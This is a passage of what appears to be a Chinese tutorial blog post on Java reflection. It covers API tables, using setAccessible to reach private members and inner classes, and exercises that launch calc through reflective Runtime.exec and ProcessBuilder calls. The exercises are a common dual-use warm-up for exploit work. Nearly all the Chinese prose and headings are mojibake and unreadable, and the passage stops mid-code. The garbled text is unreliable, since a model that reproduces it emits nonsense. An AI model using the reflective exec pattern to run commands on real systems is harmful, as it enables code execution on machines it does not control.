é”ã€åŒæ­¥ï¼Œå¦‚æœå¤šä¸ªçº¿ç¨‹åŒæ—¶å»åˆå§‹åŒ–ä¸€ä¸ªç±»ï¼Œé‚£ä¹ˆåªä¼šæœ‰ä¸€ä¸ªçº¿ç¨‹å»æ‰§è¡Œè¿™ä¸ªç±»çš„&lt;clinit&gt;()æ–¹æ³•ï¼Œå…¶ä»–çº¿ç¨‹éƒ½éœ€è¦é˜»å¡ç­‰å¾…ï¼ŒçŸ¥é“æ´»åŠ¨çº¿ç¨‹æ‰§è¡Œ&lt;clinit&gt;()æ–¹æ³•å®Œæ¯•</li></ol><h3 id="åå°„è·å–ç±»çš„ç»“æ„ä¿¡æ¯ğŸš©"><a href="#åå°„è·å–ç±»çš„ç»“æ„ä¿¡æ¯ğŸš©" class="headerlink" title="åå°„è·å–ç±»çš„ç»“æ„ä¿¡æ¯ğŸš©"></a>åå°„è·å–ç±»çš„ç»“æ„ä¿¡æ¯ğŸš©</h3><h4 id="java-lang-Class"><a href="#java-lang-Class" class="headerlink" title="java.lang.Class"></a>java.lang.Class</h4><table><thead><tr><th>æ–¹æ³•</th><th>ä½œç”¨</th></tr></thead><tbody><tr><td>getName()</td><td>è·å–å…¨ç±»å</td></tr><tr><td>getSimpleName()</td><td>è·å–ç®€å•ç±»å</td></tr><tr><td>getFieIds()</td><td>è·å–æ‰€æœ‰Publicä¿®é¥°çš„å±æ€§ï¼ŒåŒ…å«æœ¬ç±»ä»¥åŠçˆ¶ç±»</td></tr><tr><td>getDeclaredFields()</td><td>è·å–æœ¬ç±»ä¸­æ‰€æœ‰çš„å±æ€§ã€æ‰€æœ‰ä¿®é¥°ç¬¦ã€‘</td></tr><tr><td>getMethods()</td><td>è·å–æ‰€æœ‰publicä¿®é¥°çš„æ–¹æ³•ï¼ŒåŒ…æ‹¬æœ¬ç±»ä»¥åŠçˆ¶ç±»çš„</td></tr><tr><td>getDeclaredMethods()</td><td>è·å–æœ¬ç±»çš„æ‰€æœ‰æ–¹æ³•</td></tr><tr><td>getConstructors()</td><td>è·å–æœ¬ç±»æ‰€æœ‰publicä¿®é¥°çš„æ„é€ å™¨ï¼Œ</td></tr><tr><td>getDeclaredConstructors()</td><td>è·å–æœ¬ç±»ä¸­æ‰€æœ‰çš„æ„é€ å™¨</td></tr><tr><td>getPackage()</td><td>ä»¥Packageå½¢å¼è¿”å› åŒ…ä¿¡æ¯</td></tr><tr><td>getSuperclass()</td><td>ä»¥Classå½¢å¼è¿”å›çˆ¶ç±»ä¿¡æ¯</td></tr><tr><td>getInterfaces()</td><td>ä»¥Class[]å½¢å¼è¿”å›æ¥å£ä¿¡æ¯</td></tr><tr><td>getAnnotations()</td><td>ä»¥Annotation[] å½¢å¼è¿”å›æ³¨è§£ä¿¡æ¯</td></tr><tr><td>getContructor(Classâ€¦clazz)</td><td>æ ¹æ®å‚æ•°åˆ—è¡¨ï¼Œè·å–å¯¹åº”çš„publicæ„é€ å™¨å¯¹è±¡</td></tr><tr><td>getDecalaredContructor(Class.clazz)</td><td>æ ¹æ®å‚æ•°åˆ—è¡¨ï¼Œè·å–å¯¹åº”çš„æ„é€ å™¨</td></tr><tr><td>newInstance()</td><td>è°ƒç”¨ç±»ä¸­çš„æ— å‚æ„é€ å™¨ï¼Œè·å–å¯¹åº”ç±»çš„å¯¹è±¡</td></tr></tbody></table><h4 id="java-lang-reflect-FieId"><a href="#java-lang-reflect-FieId" class="headerlink" title="java.lang.reflect.FieId"></a>java.lang.reflect.FieId</h4><table><thead><tr><th>æ–¹æ³•</th><th>ä½œç”¨</th></tr></thead><tbody><tr><td>getModifiers()</td><td>ä»¥intå½¢å¼è¿”å›ä¿®é¥°ç¬¦ï¼Œé»˜è®¤ä¿®é¥°ç¬¦æ˜¯0ï¼Œpublicæ˜¯1ï¼Œprivateæ˜¯2ï¼Œprotectedæ˜¯4ï¼Œstaticæ˜¯8ï¼Œfinalæ˜¯16ï¼Œå¤šä¸ªä¿®é¥°ç¬¦åˆ™ç›¸åŠ </td></tr><tr><td>getType()</td><td>è¯¥å±æ€§çš„ç±»å‹ï¼Œè¿”å›å±æ€§å¯¹åº”ç±»å‹çš„Classå¯¹è±¡</td></tr><tr><td>getName()</td><td>è¿”å›è¯¥å±æ€§çš„åç§°</td></tr></tbody></table><h4 id="java-lang-reflect-Method"><a href="#java-lang-reflect-Method" class="headerlink" title="java.lang.reflect.Method"></a>java.lang.reflect.Method</h4><table><thead><tr><th>æ–¹æ³•</th><th>ä½œç”¨</th></tr></thead><tbody><tr><td>getModifiers()</td><td>ä»¥intå½¢å¼è¿”å›ä¿®é¥°ç¬¦ï¼Œé»˜è®¤ä¿®é¥°ç¬¦æ˜¯0ï¼Œpublicæ˜¯1ï¼Œprivateæ˜¯2ï¼Œprotectedæ˜¯4ï¼Œstaticæ˜¯8ï¼Œfinalæ˜¯16ï¼Œå¤šä¸ªä¿®é¥°ç¬¦åˆ™ç›¸åŠ </td></tr><tr><td>getReturnType()</td><td>ä»¥Classå½¢å¼è·å– è¿”å›ç±»å‹</td></tr><tr><td>getName()</td><td>è·å–æ–¹æ³•å</td></tr><tr><td>getParameterTypes()</td><td>ä»¥Class[]è¿”å›å‚æ•°ç±»å‹æ•°ç»„</td></tr></tbody></table><h4 id="java-lang-reflect-Constructor"><a href="#java-lang-reflect-Constructor" class="headerlink" title="java.lang.reflect.Constructor"></a>java.lang.reflect.Constructor</h4><table><thead><tr><th>æ–¹æ³•</th><th>ä½œç”¨</th></tr></thead><tbody><tr><td>getModifiers()</td><td>ä»¥intå½¢å¼è¿”å›ä¿®é¥°ç¬¦ï¼Œé»˜è®¤ä¿®é¥°ç¬¦æ˜¯0ï¼Œpublicæ˜¯1ï¼Œprivateæ˜¯2ï¼Œprotectedæ˜¯4ï¼Œstaticæ˜¯8ï¼Œfinalæ˜¯16ï¼Œå¤šä¸ªä¿®é¥°ç¬¦åˆ™ç›¸åŠ </td></tr><tr><td>getName</td><td>è¿”å›æ„é€ å™¨åï¼ˆå…¨ç±»åï¼‰</td></tr><tr><td>getParameterTypes()</td><td>ä»¥Class[]è¿”å›å‚æ•°ç±»å‹æ•°ç»„</td></tr><tr><td>setAccessible()</td><td>ä½¿ç”¨åå°„å¯ä»¥è®¿é—®privateçš„æ–¹æ³•æˆ–æ„é€ å™¨</td></tr><tr><td>newInstance(Class.clazzâ€¦)</td><td>æ ¹æ®å‚æ•°åˆ—è¡¨ï¼Œåˆ›å»ºå¯¹åº”çš„å®ä¾‹</td></tr></tbody></table><h4 id="é€šè¿‡åå°„åˆ›å»ºå¯¹è±¡"><a href="#é€šè¿‡åå°„åˆ›å»ºå¯¹è±¡" class="headerlink" title="é€šè¿‡åå°„åˆ›å»ºå¯¹è±¡"></a>é€šè¿‡åå°„åˆ›å»ºå¯¹è±¡</h4><h5 id="è°ƒç”¨ç±»ä¸­çš„publicä¿®é¥°çš„æ— å‚æ„é€ å™¨"><a href="#è°ƒç”¨ç±»ä¸­çš„publicä¿®é¥°çš„æ— å‚æ„é€ å™¨" class="headerlink" title="è°ƒç”¨ç±»ä¸­çš„publicä¿®é¥°çš„æ— å‚æ„é€ å™¨"></a>è°ƒç”¨ç±»ä¸­çš„publicä¿®é¥°çš„æ— å‚æ„é€ å™¨</h5><ul><li><code>newInstance()</code>è°ƒç”¨ç±»ä¸­çš„æ— å‚æ„é€ å™¨ï¼Œè·å–å¯¹åº”ç±»çš„å¯¹è±¡</li></ul><h5 id="è°ƒç”¨ç±»ä¸­çš„æŒ‡å®šæ„é€ å™¨"><a href="#è°ƒç”¨ç±»ä¸­çš„æŒ‡å®šæ„é€ å™¨" class="headerlink" title="è°ƒç”¨ç±»ä¸­çš„æŒ‡å®šæ„é€ å™¨"></a>è°ƒç”¨ç±»ä¸­çš„æŒ‡å®šæ„é€ å™¨</h5><ul><li><code>getContructor(Class...clazz)</code>ï¼šæ ¹æ®å‚æ•°åˆ—è¡¨ï¼Œè·å–å¯¹åº”çš„publicæ„é€ å™¨å¯¹è±¡</li><li><code>getDecalaredContructor(Class.clazz)</code>ï¼šæ ¹æ®å‚æ•°åˆ—è¡¨ï¼Œè·å–å¯¹åº”çš„æ„é€ å™¨</li><li><code>setAccessible()</code>ï¼šçˆ†ç ´ï¼Œä½¿ç”¨åå°„å¯ä»¥è®¿é—®privateçš„æ–¹æ³•æˆ–æ„é€ å™¨</li><li><code>newInstance(Object...obj)</code>ï¼šè°ƒç”¨æŒ‡å®šå‚æ•°åˆ—è¡¨çš„æ„é€ å™¨</li></ul><h4 id="é€šè¿‡åå°„è®¿é—®ç±»ä¸­çš„æˆå‘˜"><a href="#é€šè¿‡åå°„è®¿é—®ç±»ä¸­çš„æˆå‘˜" class="headerlink" title="é€šè¿‡åå°„è®¿é—®ç±»ä¸­çš„æˆå‘˜"></a>é€šè¿‡åå°„è®¿é—®ç±»ä¸­çš„æˆå‘˜</h4><h5 id="è®¿é—®å±æ€§"><a href="#è®¿é—®å±æ€§" class="headerlink" title="è®¿é—®å±æ€§"></a>è®¿é—®å±æ€§</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchFieldException, InstantiationException, IllegalAccessException </span>&#123;<br>    <span class="hljs-comment">// 1.è·å–Userå¯¹è±¡çš„Classå¯¹è±¡å’Œå¯¹è±¡å®ä¾‹</span><br>    Class&lt;?&gt; aClass = Class.forName(<span class="hljs-string">&quot;com.mechoy.reflection.User00&quot;</span>);<br>    Object o = aClass.newInstance();<br>    <span class="hljs-comment">// 2.æ ¹æ®å±æ€§åè·å–FieIdå¯¹è±¡</span><br>    Field sal = aClass.getDeclaredField(<span class="hljs-string">&quot;sal&quot;</span>);<br>    sal.setAccessible(<span class="hljs-keyword">true</span>);<span class="hljs-comment">// è®¿é—®ç§æœ‰å±æ€§</span><br>    sal.set(o,<span class="hljs-number">9999.0</span>);  <span class="hljs-comment">// è®¾ç½®å±æ€§å€¼</span><br>    System.out.println(sal.get(o)); <span class="hljs-comment">// è®¿é—®å±æ€§å€¼</span><br><br>    <span class="hljs-comment">// å¦‚æœæ˜¯é™æ€å±æ€§ï¼Œåˆ™setå’Œgetä¸­çš„å‚æ•°o,å¯ä»¥å†™æˆnull</span><br>    <span class="hljs-comment">// å› ä¸ºé™æ€å±æ€§æ˜¯åœ¨ç±»åŠ è½½çš„æ—¶å€™å°±åˆ›å»ºäº†çš„</span><br>&#125;<br></code></pre></td></tr></table></figure><h5 id="è®¿é—®æ–¹æ³•"><a href="#è®¿é—®æ–¹æ³•" class="headerlink" title="è®¿é—®æ–¹æ³•"></a>è®¿é—®æ–¹æ³•</h5><ol><li><p>æ ¹æ®æ–¹æ³•åå’Œå‚æ•°åˆ—è¡¨è·å–Methodæ–¹æ³•å¯¹è±¡</p><p><code>Method m = clazz.getDeclaredMethod(æ–¹æ³•å,Class.clazz...)</code></p></li><li><p>è·å–å¯¹è±¡</p><p><code>Object o = clazz.newInstance()</code></p></li><li><p>çˆ†ç ´ï¼ˆå¯¹äºépublicæ–¹æ³•ï¼‰</p><p><code>m.setAccessible(true)</code></p></li><li><p>è®¿é—®</p><p><code>Object returnVlaue = m.invoke(o,å®å‚åˆ—è¡¨)</code></p></li><li><p>æ³¨æ„ï¼šå¦‚æœæ˜¯é™æ€è®¿é—®ï¼Œåˆ™invokeçš„å‚æ•°oï¼Œå¯ä»¥å†™æˆnull</p></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.mechoy.reflection;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ReflectMethod</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException, InvocationTargetException </span>&#123;<br>        <span class="hljs-comment">// 1.è·å–classå¯¹è±¡ï¼Œåˆ›å»ºå®ä¾‹</span><br>        Class&lt;?&gt; aClass = Class.forName(<span class="hljs-string">&quot;com.mechoy.reflection.Boss&quot;</span>);<br>        Object o = aClass.newInstance();<br>        <span class="hljs-comment">// 2.</span><br>        <span class="hljs-comment">// 2.è·å–æ–¹æ³•å¯¹è±¡</span><br>        Method say = aClass.getDeclaredMethod(<span class="hljs-string">&quot;say&quot;</span>, <span class="hljs-keyword">int</span>.class, String.class, <span class="hljs-keyword">char</span>.class);<br>        <span class="hljs-comment">// 3.è®¾ç½®çˆ†ç ´</span><br>        say.setAccessible(<span class="hljs-keyword">true</span>);<br>        <span class="hljs-comment">// 4.è°ƒç”¨æ–¹æ³•</span><br><span class="hljs-comment">//        Object invoke = say.invoke(o, 1, &quot;2&quot;, &#x27;3&#x27;);</span><br>        Object invoke = say.invoke(<span class="hljs-keyword">null</span>, <span class="hljs-number">1</span>, <span class="hljs-string">&quot;2&quot;</span>, <span class="hljs-string">&#x27;3&#x27;</span>);<br>        System.out.println(invoke);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Boss</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> age;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String name;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Boss</span><span class="hljs-params">()</span> </span>&#123;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title">say</span><span class="hljs-params">(<span class="hljs-keyword">int</span> n,String s,<span class="hljs-keyword">char</span> c)</span></span>&#123;<br>        <span class="hljs-keyword">return</span> n + <span class="hljs-string">&quot; &quot;</span> + s + <span class="hljs-string">&quot; &quot;</span> + c;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">hi</span><span class="hljs-params">(String s)</span></span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;hi &quot;</span> + s);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="é€šè¿‡åå°„è·å–å†…éƒ¨ç±»"><a href="#é€šè¿‡åå°„è·å–å†…éƒ¨ç±»" class="headerlink" title="é€šè¿‡åå°„è·å–å†…éƒ¨ç±»"></a>é€šè¿‡åå°„è·å–å†…éƒ¨ç±»</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.mechoy.reflection.inner;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LocalInnerClass</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception</span>&#123;<br>        Class&lt;?&gt; outClass = Class.forName(<span class="hljs-string">&quot;com.mechoy.reflection.inner.OuterClass&quot;</span>);<br>        Class&lt;?&gt; inClass = Class.forName(<span class="hljs-string">&quot;com.mechoy.reflection.inner.OuterClass$InnerClass&quot;</span>);<br>        <span class="hljs-comment">// è°ƒç”¨å†…éƒ¨ç±»çš„publicæ–¹æ³•</span><br>        <span class="hljs-comment">// 1.æ ¹æ®æ–¹æ³•åè·å–Methodå¯¹è±¡</span><br>        Method print1 = inClass.getMethod(<span class="hljs-string">&quot;print1&quot;</span>);<br>        <span class="hljs-comment">// 2.è·å–å†…éƒ¨ç±»çš„å®ä¾‹</span><br>        <span class="hljs-comment">// æ³¨æ„:å†…éƒ¨ç±»æ— æ³•ç›´æ¥newInstance()ï¼Œéœ€è¦å…ˆè·å–å…¶æ„é€ å™¨</span><br>        <span class="hljs-comment">// éœ€è¦ä½¿ç”¨getDeclaredConstructors()è·å–å…¶æ„é€ å™¨</span><br>        Constructor&lt;?&gt; declaredConstructor = inClass.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>        <span class="hljs-comment">// 3.ä½¿ç”¨newInstance()è·å–å®ä¾‹å¯¹è±¡</span><br>        <span class="hljs-comment">// æ³¨æ„:éœ€è¦ä¼ å…¥å¤–éƒ¨ç±»çš„å®ä¾‹å¯¹è±¡</span><br>        Object o = declaredConstructor.newInstance(outClass.newInstance());<br>        <span class="hljs-comment">// 4.è°ƒç”¨å†…éƒ¨ç±»çš„æ–¹æ³•</span><br>        print1.invoke(o);<br><br>        <span class="hljs-comment">// è·å–å†…éƒ¨ç±»çš„épublicæ–¹æ³•</span><br>        <span class="hljs-comment">// 1.ä½¿ç”¨getDeclaredMethod() è·å–épublicä¿®é¥°çš„æ–¹æ³•</span><br>        Method print2 = inClass.getDeclaredMethod(<span class="hljs-string">&quot;print2&quot;</span>);<br>        <span class="hljs-comment">// 2.è®¾ç½®</span><br>        print2.setAccessible(<span class="hljs-keyword">true</span>);<br>        <span class="hljs-comment">// 3.è°ƒç”¨</span><br>        print2.invoke(inClass.getDeclaredConstructors()[<span class="hljs-number">0</span>].newInstance(outClass.newInstance()));<br><br>        <span class="hljs-comment">// è·å–å†…éƒ¨ç±»çš„publicå±æ€§</span><br>        Field m = inClass.getField(<span class="hljs-string">&quot;m&quot;</span>);<br>        System.out.println(m.get(inClass.getDeclaredConstructors()[<span class="hljs-number">0</span>].newInstance(outClass.newInstance())));<br><br>        <span class="hljs-comment">// è®¾ç½®å†…éƒ¨ç±»çš„publicå±æ€§</span><br>        <span class="hljs-comment">// 1.è·å–ä¸€ä¸ªå†…éƒ¨ç±»çš„å®ä¾‹å¯¹è±¡</span><br>        <span class="hljs-comment">// æ³¨æ„:è¿™æ˜¯å› ä¸ºè®¾ç½®æ—¶å“ªä¸€ä¸ªå®ä¾‹å¯¹è±¡ï¼Œå°±åº”è¯¥å†è·å–å…¶å€¼ï¼Œå¦åˆ™çœ‹ä¸å‡ºæ¥å˜åŒ–</span><br>        Object inClassIns = inClass.getDeclaredConstructors()[<span class="hljs-number">0</span>].newInstance(outClass.newInstance());<br>        m.set(inClassIns,<span class="hljs-number">999</span>);<br>        System.out.println(m.get(inClassIns));<br><br>        <span class="hljs-comment">// è·å–å†…éƒ¨ç±»çš„épublicå±æ€§</span><br>        Field n = inClass.getDeclaredField(<span class="hljs-string">&quot;n&quot;</span>);<br>        <span class="hljs-comment">// ç§æœ‰å±æ€§éœ€è¦åŠ ä¸Šï¼Œè¿è¡Œæ—¶è®¿é—®æ£€æŸ¥</span><br>        n.setAccessible(<span class="hljs-keyword">true</span>);<br>        System.out.println(n.get(inClass.getDeclaredConstructors()[<span class="hljs-number">0</span>].newInstance(outClass.newInstance())));<br><br>        <span class="hljs-comment">// è®¾ç½®å†…éƒ¨ç±»çš„épublicå±æ€§</span><br>        Object inClassFie = inClass.getDeclaredConstructors()[<span class="hljs-number">0</span>].newInstance(outClass.newInstance());<br>        n.setAccessible(<span class="hljs-keyword">true</span>);<br>        n.set(inClassFie,<span class="hljs-number">123</span>);<br>        System.out.println(n.get(inClassFie));<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">OuterClass</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">print</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;i am Outer class&quot;</span>);<br>    &#125;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">InnerClass</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> m = <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> n = <span class="hljs-number">2</span>;<br>        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">print1</span><span class="hljs-params">()</span></span>&#123;<br>            System.out.println(<span class="hljs-string">&quot;I am public method of inner class&quot;</span>);<br>        &#125;<br>        <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">print2</span><span class="hljs-params">()</span></span>&#123;<br>            System.out.println(<span class="hljs-string">&quot;I am private method of inner class&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="åå°„ç›¸å…³ç±»"><a href="#åå°„ç›¸å…³ç±»" class="headerlink" title="åå°„ç›¸å…³ç±»"></a>åå°„ç›¸å…³ç±»</h3><p><code>java.lang.Class</code>: ä»£è¡¨ä¸€ä¸ªç±»ï¼ŒClasså¯¹è±¡è¡¨ç¤ºæŸä¸ªç±»åŠ è½½åå†å †ä¸­çš„å¯¹è±¡</p><p><code>java.lang.reflect.Method</code>: ä»£è¡¨ç±»çš„æ–¹æ³•ï¼ŒMethodå¯¹è±¡è¡¨ç¤ºæŸä¸ªç±»çš„æ–¹æ³•</p><p><code>java.lang.reflect.FieId</code>: ä»£è¡¨ç±»çš„æˆå‘˜å˜é‡ï¼ŒFieIdå¯¹è±¡è¡¨ç¤ºæŸä¸ªç±»çš„æˆå‘˜å˜é‡</p><p><code>java.lang.reflect.Constructor</code>: ä»£è¡¨ç±»çš„æ„é€ æ–¹æ³•ï¼ŒConstructorå¯¹è±¡è¡¨ç¤ºæŸä¸ªç±»çš„æ„é€ å™¨</p><h3 id="åå°„è°ƒç”¨æ€§èƒ½ä¼˜åŒ–"><a href="#åå°„è°ƒç”¨æ€§èƒ½ä¼˜åŒ–" class="headerlink" title="åå°„è°ƒç”¨æ€§èƒ½ä¼˜åŒ–"></a>åå°„è°ƒç”¨æ€§èƒ½ä¼˜åŒ–</h3><h4 id="å…³é—­è®¿é—®æ£€æŸ¥"><a href="#å…³é—­è®¿é—®æ£€æŸ¥" class="headerlink" title="å…³é—­è®¿é—®æ£€æŸ¥"></a>å…³é—­è®¿é—®æ£€æŸ¥</h4><ol><li><p>Methodã€FieIdã€Constructorå¯¹è±¡éƒ½æœ‰setAccessible()æ–¹æ³•</p></li><li><p>setAccessible()ä½œç”¨æ˜¯å¯åŠ¨å’Œç¦ç”¨è®¿é—®å®‰å…¨æ£€æŸ¥çš„å¼€å…³</p></li><li><p>å‚æ•°å€¼ä¸ºtrueè¡¨ç¤ºï¼Œåå°„çš„å¯¹è±¡åœ¨ä½¿ç”¨æ—¶å–æ¶ˆè®¿é—®æ£€æŸ¥ï¼Œæé«˜åå°„çš„æ•ˆç‡ã€‚å‚æ•°å€¼ä¸ºfalseåˆ™è¡¨ç¤ºåå°„çš„å¯¹è±¡æ‰§è¡Œè®¿é—®æ£€æŸ¥</p></li></ol><h3 id="Classç±»å¸¸ç”¨æ–¹æ³•"><a href="#Classç±»å¸¸ç”¨æ–¹æ³•" class="headerlink" title="Classç±»å¸¸ç”¨æ–¹æ³•"></a>Classç±»å¸¸ç”¨æ–¹æ³•</h3><p>â€¦</p><h3 id="ç»ƒä¹ "><a href="#ç»ƒä¹ " class="headerlink" title="ç»ƒä¹ "></a>ç»ƒä¹ </h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// åå°„è°ƒç”¨Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RuntimeTest</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception</span>&#123;<br>        Class&lt;?&gt; runtimeClass = Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br>        System.out.println(runtimeClass);<br><span class="hljs-comment">//        Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="hljs-comment">//        Method exec = runtimeClass.getMethod(&quot;exec&quot;, String.class);</span><br><span class="hljs-comment">//        Method getRuntime = runtimeClass.getMethod(&quot;getRuntime&quot;);</span><br><span class="hljs-comment">//        exec.invoke(getRuntime.invoke(runtimeClass),&quot;calc&quot;);</span><br><br>        runtimeClass.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class).invoke(<br>                runtimeClass.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>).invoke(runtimeClass),<span class="hljs-string">&quot;calc&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// åå°„è°ƒç”¨ProcessBuilder(&quot;calc&quot;).start();</span><br><span class="hljs-keyword">package</span> com.mechoy.reflection;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.Arrays;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ProcessBuilderTest</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception 